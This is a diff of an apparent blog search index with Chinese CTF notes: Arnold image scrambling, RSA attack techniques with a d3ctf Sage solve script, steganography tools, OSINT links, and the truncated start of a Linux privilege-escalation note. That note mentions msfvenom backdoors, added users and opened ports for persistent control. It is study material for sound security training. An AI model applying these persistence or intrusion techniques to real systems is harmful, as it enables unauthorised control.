@@ -207,10 +207,15 @@ y=(-bx&#39;+y)mod(N)
 </ul>
 <h1 id="python-实现">Python 实现</h1>
 <p>以下借助了 Pillow 库实现功能</p>
-<p>其中<span class="math inline">\(a、b\)</span>为给定参数，<span class="math inline">\(N\)</span>为置乱次数
-(shuffle_times)，<code>reverse</code> 为是否倒置变换
-(可能会出现变换倒置的问题)</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># Anrold 变换</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">infile: 输入图像路径</span></span><br><span class="line"><span class="string">outfile: 输出图像路径</span></span><br><span class="line"><span class="string">a: Anrold 变换参数</span></span><br><span class="line"><span class="string">b: Anrold 变换参数</span></span><br><span class="line"><span class="string">N: 置乱次数 (shuffle_times)</span></span><br><span class="line"><span class="string">reverse: 是否逆变换</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arnold</span>(<span class="params">infile:<span class="built_in">str</span>, outfile:<span class="built_in">str</span>=<span class="literal">None</span>, a:<span class="built_in">int</span>=<span class="number">1</span>, b:<span class="built_in">int</span>=<span class="number">1</span>, N:<span class="built_in">int</span>=<span class="number">1</span>, reverse:<span class="built_in">bool</span>=<span class="literal">False</span></span>):</span></span><br><span class="line">    inimg = Image.<span class="built_in">open</span>(infile)</span><br><span class="line">    width, height = inimg.size</span><br><span class="line">    indata = inimg.load()</span><br><span class="line">    outimg = Image.new(inimg.mode, inimg.size)</span><br><span class="line">    outdata = outimg.load()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                <span class="keyword">if</span> reverse:</span><br><span class="line">                    nx = ((a * b + <span class="number">1</span>) * x - a * y) % width</span><br><span class="line">                    ny = (y - b * x) % height</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    nx = (x + a * y) % width</span><br><span class="line">                    ny = (b * x + (a * b + <span class="number">1</span>) * y) % height</span><br><span class="line">                outdata[nx, ny] = indata[x, y]</span><br><span class="line">    </span><br><span class="line">    outimg.save(outfile <span class="keyword">if</span> outfile <span class="keyword">else</span> <span class="string">&quot;arnold_&quot;</span>+infile, inimg.<span class="built_in">format</span>)</span><br><span class="line"></span><br><span class="line">arnold(<span class="string">&quot;before.png&quot;</span>, <span class="string">&quot;encode.png&quot;</span>, <span class="number">9</span>, <span class="number">39</span>, <span class="number">1</span>)</span><br><span class="line">arnold(<span class="string">&quot;encode.png&quot;</span>, <span class="string">&quot;decode.png&quot;</span>, <span class="number">9</span>, <span class="number">39</span>, <span class="number">1</span>, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>其中 <code>a</code>、<code>b</code>
+为给定参数，<code>shuffle_times</code> 为置乱次数，<code>reverse</code>
+为是否进行逆变换。</p>
+<p>需要注意的是，有时候 <code>a</code>、<code>b</code>
+参数互换，得到的结果不一样。</p>
+<p>更需要注意的是，有时候 <code>outdata[ny, nx] = indata[y, x]</code>
+需要转换为
+<code>outdata[nx, ny] = indata[x, y]</code>，这取决于原本进行变换的时候是如何读取像素的。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arnold</span>(<span class="params">infile: <span class="built_in">str</span>, outfile: <span class="built_in">str</span> = <span class="literal">None</span>, a: <span class="built_in">int</span> = <span class="number">1</span>, b: <span class="built_in">int</span> = <span class="number">1</span>, shuffle_times: <span class="built_in">int</span> = <span class="number">1</span>, reverse: <span class="built_in">bool</span> = <span class="literal">False</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Arnold猫脸变换函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        infile - 输入图像路径</span></span><br><span class="line"><span class="string">        outfile - 输出图像路径</span></span><br><span class="line"><span class="string">        a - Anrold 变换参数</span></span><br><span class="line"><span class="string">        b - Anrold 变换参数</span></span><br><span class="line"><span class="string">        shuffle_times - 置乱次数</span></span><br><span class="line"><span class="string">        reverse - 逆变换</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    inimg = Image.<span class="built_in">open</span>(infile)</span><br><span class="line">    width, height = inimg.size</span><br><span class="line">    indata = inimg.load()</span><br><span class="line">    outimg = Image.new(inimg.mode, inimg.size)</span><br><span class="line">    outdata = outimg.load()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(shuffle_times):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                <span class="keyword">if</span> reverse:</span><br><span class="line">                    nx = ((a * b + <span class="number">1</span>) * x - a * y) % width</span><br><span class="line">                    ny = (y - b * x) % height</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    nx = (x + a * y) % width</span><br><span class="line">                    ny = (b * x + (a * b + <span class="number">1</span>) * y) % height</span><br><span class="line">                outdata[ny, nx] = indata[y, x]</span><br><span class="line">    </span><br><span class="line">    outimg.save(outfile <span class="keyword">if</span> outfile <span class="keyword">else</span> <span class="string">&quot;arnold_&quot;</span>+infile, inimg.<span class="built_in">format</span>)</span><br><span class="line"></span><br><span class="line">arnold(<span class="string">&quot;before.png&quot;</span>, <span class="string">&quot;encode.png&quot;</span>, <span class="number">9</span>, <span class="number">39</span>, <span class="number">1</span>)</span><br><span class="line">arnold(<span class="string">&quot;encode.png&quot;</span>, <span class="string">&quot;decode.png&quot;</span>, <span class="number">9</span>, <span class="number">39</span>, <span class="number">1</span>, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
 ]]></content>
       <tags>
         <tag>note</tag>
@@ -2822,14 +2827,14 @@ e = 65537 c =
 <p><span class="math inline">\(e=2\)</span></p>
 <h3 id="原理-6">原理</h3>
 <ul>
-<li><p>计算出<span class="math inline">\(m_p\)</span>和<span class="math inline">\(m_q\)</span>： <span class="math display">\[
-m_p=\sqrt{c}\ mod\ p
-m_q=\sqrt{c}\ mod\ q
+<li><p>计算出 <span class="math inline">\(m_p\)</span> 和<span class="math inline">\(m_q\)</span>： <span class="math display">\[
+m_p=\sqrt{c}\mod{p}\\
+m_q=\sqrt{c}\mod{q}
 \]</span></p></li>
-<li><p>利用扩展欧几里得算法计算出<span class="math inline">\(y_p\)</span>和<span class="math inline">\(y_q\)</span> <span class="math display">\[
+<li><p>利用扩展欧几里得算法计算出 <span class="math inline">\(y_p\)</span> 和 <span class="math inline">\(y_q\)</span> <span class="math display">\[
 y_p·p+y_q·q=1
 \]</span></p></li>
-<li><p>最后解得四个明文： <span class="math display">\[
+<li><p>然后解得四个明文： <span class="math display">\[
 a=(y_p·p·m_q+y_q·q·m_p)\ mod\ n\\
 b=n-a\\
 c=(y_p·p·m_q-y_q·q·m_p)\ mod\ n\\
@@ -2923,6 +2928,49 @@ N^{0.99}\)</span>，且 Sarkar’s method 与存在范围 <span class="math inli
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> msg</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;d3ctf&#123;&#x27;</span>+md5(msg).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line"><span class="keyword">assert</span> p &gt; q</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = bytes_to_long(msg)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">N = <span class="built_in">pow</span>(p, <span class="number">7</span>) * q</span><br><span class="line">phi = <span class="built_in">pow</span>(p, <span class="number">6</span>) * (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d1 = getPrime(<span class="number">2000</span>)</span><br><span class="line">d2 = nextprime(d1 + getPrime(<span class="number">1000</span>))</span><br><span class="line">e1 = invert(d1, phi)</span><br><span class="line">e2 = invert(d2, phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N = <span class="subst">&#123;N&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e1 = <span class="subst">&#123;e1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e2 = <span class="subst">&#123;e2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 2420624631315473673388732074340410215657378096737020976722603529598864338532404224879219059105950005655100728361198499550862405660043591919681568611707967</span></span><br><span class="line"><span class="string">N = 1476751427633071977599571983301151063258376731102955975364111147037204614220376883752032253407881568290520059515340434632858734689439268479399482315506043425541162646523388437842149125178447800616137044219916586942207838674001004007237861470176454543718752182312318068466051713087927370670177514666860822341380494154077020472814706123209865769048722380888175401791873273850281384147394075054950169002165357490796510950852631287689747360436384163758289159710264469722036320819123313773301072777844457895388797742631541101152819089150281489897683508400098693808473542212963868834485233858128220055727804326451310080791</span></span><br><span class="line"><span class="string">e1 = 425735006018518321920113858371691046233291394270779139216531379266829453665704656868245884309574741300746121946724344532456337490492263690989727904837374279175606623404025598533405400677329916633307585813849635071097268989906426771864410852556381279117588496262787146588414873723983855041415476840445850171457530977221981125006107741100779529209163446405585696682186452013669643507275620439492021019544922913941472624874102604249376990616323884331293660116156782891935217575308895791623826306100692059131945495084654854521834016181452508329430102813663713333608459898915361745215871305547069325129687311358338082029</span></span><br><span class="line"><span class="string">e2 = 1004512650658647383814190582513307789549094672255033373245432814519573537648997991452158231923692387604945039180687417026069655569594454408690445879849410118502279459189421806132654131287284719070037134752526923855821229397612868419416851456578505341237256609343187666849045678291935806441844686439591365338539029504178066823886051731466788474438373839803448380498800384597878814991008672054436093542513518012957106825842251155935855375353004898840663429274565622024673235081082222394015174831078190299524112112571718817712276118850981261489528540025810396786605197437842655180663611669918785635193552649262904644919</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
 <p><code>exp.sage</code></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">1476751427633071977599571983301151063258376731102955975364111147037204614220376883752032253407881568290520059515340434632858734689439268479399482315506043425541162646523388437842149125178447800616137044219916586942207838674001004007237861470176454543718752182312318068466051713087927370670177514666860822341380494154077020472814706123209865769048722380888175401791873273850281384147394075054950169002165357490796510950852631287689747360436384163758289159710264469722036320819123313773301072777844457895388797742631541101152819089150281489897683508400098693808473542212963868834485233858128220055727804326451310080791</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">425735006018518321920113858371691046233291394270779139216531379266829453665704656868245884309574741300746121946724344532456337490492263690989727904837374279175606623404025598533405400677329916633307585813849635071097268989906426771864410852556381279117588496262787146588414873723983855041415476840445850171457530977221981125006107741100779529209163446405585696682186452013669643507275620439492021019544922913941472624874102604249376990616323884331293660116156782891935217575308895791623826306100692059131945495084654854521834016181452508329430102813663713333608459898915361745215871305547069325129687311358338082029</span></span><br><span class="line">e2 = <span class="number">1004512650658647383814190582513307789549094672255033373245432814519573537648997991452158231923692387604945039180687417026069655569594454408690445879849410118502279459189421806132654131287284719070037134752526923855821229397612868419416851456578505341237256609343187666849045678291935806441844686439591365338539029504178066823886051731466788474438373839803448380498800384597878814991008672054436093542513518012957106825842251155935855375353004898840663429274565622024673235081082222394015174831078190299524112112571718817712276118850981261489528540025810396786605197437842655180663611669918785635193552649262904644919</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">2420624631315473673388732074340410215657378096737020976722603529598864338532404224879219059105950005655100728361198499550862405660043591919681568611707967</span></span><br><span class="line"></span><br><span class="line">x = polygen(Zmod(N))</span><br><span class="line">f = e1 * e2 * x - (e2 - e1)</span><br><span class="line">f = f.monic()</span><br><span class="line"></span><br><span class="line">roots = f.small_roots(beta=((r - <span class="number">1</span>) / (r + <span class="number">1</span>) - <span class="number">0.01</span>), epsilon=<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">res = gmpy2.iroot(gmpy2.gcd(<span class="built_in">int</span>(f(roots[<span class="number">0</span>])), N), r - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> res[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, res[<span class="number">0</span>])</span><br><span class="line">p = res[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">q = N // (p**<span class="number">7</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(<span class="number">0x10001</span>, phi)</span><br><span class="line">msg = long_to_bytes(power_mod(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line">flag = <span class="string">&#x27;d3ctf&#123;&#x27;</span> + md5(msg).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+<h2 id="pq-存在相同-module-攻击"><span class="math inline">\(p,q\)</span> 存在相同 module 攻击</h2>
+<h3 id="特征-9">特征</h3>
+<p><span class="math inline">\(p,q\)</span> 的生成需要借助某共同的
+module <span class="math inline">\(M\)</span> 进行生成</p>
+<h3 id="代码-1">代码</h3>
+<p>直接使用他人的脚本，roca 攻击：<a href="https://github.com/jvdsn/crypto-attacks/blob/c26872bdac2e2d95c5be00e6e593c891c849f446/attacks/factorization/roca.py">https://github.com/jvdsn/crypto-attacks/blob/c26872bdac2e2d95c5be00e6e593c891c849f446/attacks/factorization/roca.py</a></p>
+<h2 id="e-较小时的有限域开方攻击"><span class="math inline">\(e\)</span>
+较小时的有限域开方攻击</h2>
+<h3 id="特征-10">特征</h3>
+<p><span class="math inline">\(e\)</span> 较小，比如说 10、50、100
+等等。</p>
+<p>或者 <span class="math inline">\(\gcd(e,
+\varphi(p))\neq1\)</span>，即 <span class="math inline">\(e\)</span> 与
+<span class="math inline">\(\varphi(p)\)</span> 不互素的情况。</p>
+<h3 id="原理-9">原理</h3>
+<p><span class="math inline">\(e\)</span>
+较小时，有限域开方速度较快。</p>
+<p>同时运用到了高次剩余的定理：</p>
+<p>对于同余式 <span class="math inline">\(X^n\equiv
+d\pmod{p}\)</span></p>
+<p>当 <span class="math inline">\(n|p-1\)</span> 时，满足 <span class="math display">\[
+d^{\frac{p-1}{n}}\equiv 1\pmod{p}
+\]</span> 才有解，此时解数为 <span class="math inline">\(n\)</span>；</p>
+<p>当 <span class="math inline">\(n\)</span> 无法整除 <span class="math inline">\(p-1\)</span>，满足 <span class="math display">\[
+d^{\frac{p-1}{k}}\equiv 1\pmod{p}
+\]</span> 其中 <span class="math inline">\(k=\gcd(n,p-1)\)</span>，此时解数为 <span class="math inline">\(k\)</span>。</p>
+<p>而我们需要求解的便是 <span class="math inline">\(m^e\equiv
+c\pmod{n}\)</span></p>
+<p>我们可以在 <span class="math inline">\(p,q\)</span>
+域中分别开方得到同余式组（加快求解速度） <span class="math display">\[
+\begin{cases}
+m_1=\sqrt[e]{c}\pmod{p}\\
+m_2=\sqrt[e]{c}\pmod{q}
+\end{cases}
+\]</span> 然后利用 CRT 得到 <span class="math display">\[
+\begin{cases}
+m_1=\sqrt[e]{c}\pmod{p}\\
+m_2=\sqrt[e]{c}\pmod{q}\\
+m=\sqrt[e]{c}\pmod{n}
+\end{cases}
+\]</span> 但因为有多解，所以需要进行验证。</p>
+<h3 id="代码-2">代码</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">p, q, e, c</span>):</span></span><br><span class="line">    P.&lt;x&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    f=x^e-c</span><br><span class="line">    mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">    P.&lt;x&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    g=x^e-c</span><br><span class="line">    mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line">    solution = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> mp <span class="keyword">in</span> mps:</span><br><span class="line">        x = <span class="built_in">int</span>(mp[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> mq <span class="keyword">in</span> mqs:</span><br><span class="line">            y = <span class="built_in">int</span>(mq[<span class="number">0</span>])</span><br><span class="line">            s = CRT([x, y], [p, q])</span><br><span class="line">            solution.append(s)</span><br><span class="line">    <span class="keyword">return</span> solution</span><br><span class="line"></span><br><span class="line">s = solve(p, q, e, c)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>
 ]]></content>
       <tags>
         <tag>note</tag>
@@ -7200,6 +7248,10 @@ pyc 文件中加入当前 python 版本的魔术头
 <p>图片取证主要包括隐写 (Steganography)，拼图，读图等。</p>
 <p>同时图片又有多种格式，包括但不限于 GIP, PNG, JPEG 等。</p>
 <p>以下的各种图片取证形式不限于单一格式。</p>
+<h2 id="outguess">outguess</h2>
+<h2 id="outsecret">outsecret</h2>
+<h2 id="steghide">steghide</h2>
+<h2 id="zsteg">zsteg</h2>
 <h2 id="图片像素差异">图片像素差异</h2>
 <p>以下是提取差异像素的示例脚本，注意如果差异的像素是
 <code>white</code>，需要将 <code>diff</code>
@@ -7329,15 +7381,28 @@ Linux 里可以直接安装使用。<a href="https://github.com/zed-0xff/zsteg">
 <p>使用方法：scanf("%d, %d", &amp;a, &amp;b);</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsteg 可疑图片.png</span><br></pre></td></tr></table></figure>
 <p>更多用法请使用 <code>zsteg -h</code> 或者查看 Github 主页。</p>
-<h1 id="png-取证">PNG 取证</h1>
+<h1 id="jpg-取证">JPG 取证</h1>
 <h2 id="简述-1">简述</h2>
+<p>以下的各种图片取证形式仅限于 JPG 图片格式。</p>
+<h2 id="jphs">jphs</h2>
+<p>一款 jpg 隐写软件，目前 Github 仓库已关闭 push，建议直接使用 jphs for
+windows 软件，可以在 <a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/programs.htm">http://io.acad.athabascau.ca/~grizzlie/Comp607/programs.htm</a>
+中获取。</p>
+<blockquote>
+<p>据说在国内常常使用。</p>
+</blockquote>
+<p>点击 <code>open jpeg</code> 打开图片后，可选 <code>pass phrase</code>
+添加密码，然后点击 <code>hide</code> 或者 <code>seek</code>
+即可进行隐写和数据提取。</p>
+<h1 id="png-取证">PNG 取证</h1>
+<h2 id="简述-2">简述</h2>
 <p>以下的各种图片取证形式仅限于 PNG 图片格式。</p>
 <h2 id="图片-ihdr-crc32-错误">图片 <code>IHDR</code> CRC32 错误</h2>
 <p>一般情况下这是因为宽度或者高度被篡改的缘故，可以使用以下代码对图片的宽度或者长度进行爆破：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_height</span>(<span class="params">filename:<span class="built_in">str</span>, needout:<span class="built_in">bool</span>=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pngdata = f.read()</span><br><span class="line">    height = <span class="built_in">int</span>.from_bytes(pngdata[<span class="number">20</span>:<span class="number">24</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    target = <span class="built_in">int</span>.from_bytes(pngdata[<span class="number">29</span>:<span class="number">33</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height+<span class="number">1</span>, <span class="number">0xFFFF</span>):</span><br><span class="line">        data = pngdata[<span class="number">12</span>:<span class="number">20</span>] + h.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + pngdata[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        <span class="keyword">if</span> binascii.crc32(data) == target:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Real height: <span class="subst">&#123;h&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> needout:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;crack_height_&quot;</span> + filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(pngdata[:<span class="number">12</span>] + data + pngdata[<span class="number">29</span>:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;height is real.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_width</span>(<span class="params">filename:<span class="built_in">str</span>, needout:<span class="built_in">bool</span>=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pngdata = f.read()</span><br><span class="line">    width = <span class="built_in">int</span>.from_bytes(pngdata[<span class="number">16</span>:<span class="number">20</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    target = <span class="built_in">int</span>.from_bytes(pngdata[<span class="number">29</span>:<span class="number">33</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width+<span class="number">1</span>, <span class="number">0xFFFF</span>):</span><br><span class="line">        data = pngdata[<span class="number">12</span>:<span class="number">16</span>] + w.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + pngdata[<span class="number">20</span>:<span class="number">29</span>]</span><br><span class="line">        <span class="keyword">if</span> binascii.crc32(data) == target:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Real width: <span class="subst">&#123;w&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> needout:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;crack_width_&quot;</span> + filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(pngdata[:<span class="number">12</span>] + data + pngdata[<span class="number">29</span>:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;width is real.&quot;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;false_height.png&#x27;</span></span><br><span class="line">crack_height(filename)</span><br></pre></td></tr></table></figure>
 <p><a href="https://adworld.xctf.org.cn/task/answer?type=misc&amp;number=1&amp;grade=1&amp;id=5432&amp;page=1">示例题目</a></p>
 <h1 id="gif-取证">GIF 取证</h1>
-<h2 id="简述-2">简述</h2>
+<h2 id="简述-3">简述</h2>
 <p>以下的各种图片取证形式仅限于 GIF 图片格式。</p>
 <h2 id="gif-分离">GIF 分离</h2>
 <p>如果需要对每一帧图片进行详细操作的话，最好使用 photoshop 打开 GIF
@@ -9385,6 +9450,16 @@ Malbolge 实现不会接受这样的操作数。</td>
 <li>想要查找被删除的互联网网页，或者查找被删除的社交网页，可以查找网页快照或者使用互联网档案：<a href="https://archive.org/">https://archive.org/</a></li>
 <li><a href="https://bpa.st/">https://bpa.st/</a>，一个将 python
 代码转换为短 URL 的网站</li>
+<li><a href="https://www.duplichecker.com/reverse-image-search.php">https://www.duplichecker.com/reverse-image-search.php</a>
+一个反向图像搜索器，结合多个图片搜索引擎</li>
+<li><a href="https://what3words.com/">https://what3words.com/</a>
+使用三个词表示一个地点</li>
+<li><a href="https://www.shodan.io/">https://www.shodan.io/</a>
+一个可用于搜索互联网的搜索引擎，它可以搜索所有连接到 Internet
+上的东西，包括红绿灯和粒子回旋加速器。</li>
+<li>SNMP 协议的端口通常为 161 或者 162</li>
+<li>Very-small-aperture terminal 简称 VSAT</li>
+<li>linkedin <a href="https://www.linkedin.com/">领英</a>，可以搜索求职者的一些信息，包括教育经历和求职经历</li>
 </ul>
 ]]></content>
       <tags>
@@ -9466,7 +9541,7 @@ Malbolge 实现不会接受这样的操作数。</td>
 <li><p>加密消息</p>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">SNOW.EXE <span class="literal">-C</span> <span class="literal">-m</span> <span class="string">&quot;qsdz yyds&quot;</span> <span class="literal">-p</span> <span class="string">&quot;duzou&quot;</span> infile outfile</span><br></pre></td></tr></table></figure></li>
 <li><p>提取消息</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">SNOW.EXE <span class="literal">-C</span> <span class="literal">-m</span> <span class="literal">-p</span> <span class="string">&quot;duzou&quot;</span> infile outfile</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">SNOW.EXE <span class="literal">-C</span> <span class="literal">-p</span> <span class="string">&quot;duzou&quot;</span> infile outfile</span><br></pre></td></tr></table></figure></li>
 </ul>
 <p>需要注意的是，<code>infile</code> 必须在 <code>outfile</code>
 前，如果不填 <code>infile</code> 选项，则默认从标准输入中获得；如果不填
@@ -9488,7 +9563,15 @@ Malbolge 实现不会接受这样的操作数。</td>
   <entry>
     <title>文本隐写笔记</title>
     <url>//text-forensics-note.html</url>
-    <content><![CDATA[<h1 id="snow-隐写">SNOW 隐写</h1>
+    <content><![CDATA[<h1 id="pyc-隐写">PYC 隐写</h1>
+<p>PYC
+隐写即剑龙隐写（Stegosaurus），因为该软件的名字翻译过来就是剑龙。</p>
+<p>在 <a href="https://github.com/AngelKitty/stegosaurus">https://github.com/AngelKitty/stegosaurus</a>
+可以直接安装使用此软件。（建议直接使用 Release 版本）</p>
+<p>内有 Python 脚本和编译好的 Linux 软件，按个人喜好使用。</p>
+<p>使用方式为</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./stegosaurus -x xxx.pyc</span><br></pre></td></tr></table></figure>
+<h1 id="snow-隐写">SNOW 隐写</h1>
 <p>SNOW 是 the Steganographic Nature Of Whitespace 的简写。</p>
 <p>SNOW 用于通过在行尾附加空格和制表符来隐藏 ASCII
 文本中的消息，所以当看到大量非同寻常的空格或者制表符时，可以考虑是 SNOW
@@ -9496,7 +9579,7 @@ Malbolge 实现不会接受这样的操作数。</td>
 <p>同时 SNOW 隐写主要运用在 HTML 文件（网页）中，所以 SNOW 隐写又被称为
 HTML 隐写。</p>
 <p>使用以下指令提取消息：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">SNOW.EXE <span class="literal">-C</span> <span class="literal">-m</span> <span class="literal">-p</span> password infile outfile</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">SNOW.EXE <span class="literal">-C</span> <span class="literal">-p</span> password infile outfile</span><br></pre></td></tr></table></figure>
 <p>其中 <code>-p</code> 后面跟着密码字符串，可以包含空格等字符 (例如
 <code>-p 'Hello Wolrd'</code>)。</p>
 <p>需要注意的是，<code>infile</code> 必须在 <code>outfile</code>
@@ -10340,6 +10423,210 @@ c_2=m_1+m_2\)</span></p>
       <tags>
         <tag>note</tag>
         <tag>crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux提权笔记</title>
+    <url>//linux-privilege-escalation-note.html</url>
+    <content><![CDATA[<h1 id="简述">简述</h1>
+<p>无法执行root 权限下的一下命令或者读取/root
+下的重要文件。这个时候就需要提权，在root
+权限下，还可以通过msfvenom生成其他后门文件或者一些隐藏后门。添加用户，开启其他端口等操作，达到权限持续控制。</p>
+<p>boot2root 是提权种类的一种，本质还是与 Linux 的提权有关系。</p>
+<p>Linux 提权主要是通过下面的方式：</p>
+<ul>
+<li>收集 —— 将尽可能多的信息穷举出来</li>
+<li>处理 —— 将信息分类，确定信息的有效性，按照其权重来排序</li>
+<li>搜索 —— 擅用搜索引擎，发现、查找、利用漏洞代码</li>
